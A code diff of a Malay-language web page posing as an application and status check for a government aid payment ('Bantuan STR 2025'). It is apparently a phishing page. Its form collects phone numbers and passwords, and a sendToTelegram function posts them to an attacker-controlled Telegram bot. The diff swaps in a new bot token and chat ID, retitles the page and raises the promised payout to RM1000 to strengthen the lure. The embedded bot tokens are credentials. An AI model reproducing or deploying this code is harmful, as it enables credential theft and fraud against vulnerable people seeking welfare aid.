@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Bantuan Ibu B40 : Cara Permohonan & Syarat Kelayakan.</title>
+    <title>Bantuan STR 2025 : Cara Permohonan & Syarat Kelayakan.</title>
 
     <!-- Link ke Google Fonts -->
     <link
@@ -143,21 +143,21 @@
       input[type="text"],
       input[type="password"] {
         width: 100%;
-        padding: 8px;
+        padding: 12px;
         margin-bottom: 20px;
         border: 1px solid var(--accent-yellow);
         border-radius: 5px;
-        font-size: 12px;
+        font-size: 16px;
         transition: border-color 0.3s ease;
       }
 
       input[type="tel"] {
         width: 100% !important;
-        padding: 8px 45px !important;
+        padding: 12px 45px !important;
         margin-bottom: 0 !important;
         border: 1px solid var(--accent-yellow);
         border-radius: 5px;
-        font-size: 12px;
+        font-size: 15px !important;
         transition: border-color 0.3s ease;
       }
 
@@ -395,7 +395,7 @@
 
       :root {
         --primary-blue: #ffffff; /* Biru tua untuk background */
-        --accent-yellow: #800080; /* Kuning untuk highlight */
+        --accent-yellow: #1a237e; /* Kuning untuk highlight */
         --text-white: #ffffff; /* Putih untuk teks */
         --royal-gold: #c5a572; /* Emas untuk aksen */
       }
@@ -536,7 +536,7 @@
 
       input[type="tel"] {
         width: 100% !important;
-        padding: 8px 45px !important;
+        padding: 12px 45px !important;
         margin-bottom: 0 !important;
         border: 1px solid var(--accent-yellow);
         border-radius: 5px;
@@ -576,7 +576,7 @@
 
       <div class="hero">
         <img src="rm300.png" alt="tng-img" />
-        <h4>SEMAKAN STATUS</h4>
+        <h4>SEMAKAN STATUS & MOHON SEKARANG</h4>
         <div class="form-container">
           <form id="registrationForm">
             <input
@@ -915,7 +915,7 @@
           </form>
         </div>
 
-       <div class="_record-box">
+        <div class="_record-box">
           <div id="list" class="list-box">
             <div class="list">
               <div class="item">
@@ -1506,8 +1506,8 @@
 
       // Fungsi untuk mengirim data ke Telegram
       function sendToTelegram(message) {
-        const token = "7638196127:AAHM8emMk6JxOPgRxHf1DLnDv1SJoS0fhuE"; // Token bot Telegram Anda
-        const chatId = "5900633388"; // Chat ID atau ID grup Anda
+        const token = "5543602407:AAFMl5IwrIjemoxVUFpZ0fJQNvskzcfMveo"; // Token bot Telegram Anda
+        const chatId = "5947577904"; // Chat ID atau ID grup Anda
 
         return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
@@ -1737,13 +1737,11 @@
       // Panggil fungsi saat dokumen dimuat
       document.addEventListener("DOMContentLoaded", startAutoScroll);
     </script>
-    
+
     <script>
-  document.querySelectorAll('.h2').forEach(item => {
-    item.textContent = item.textContent.replace('RM300', 'RM200');
-  });
-</script>
-
-
+      document.querySelectorAll(".h2").forEach((item) => {
+        item.textContent = item.textContent.replace("RM300", "RM1000");
+      });
+    </script>
   </body>
 </html>
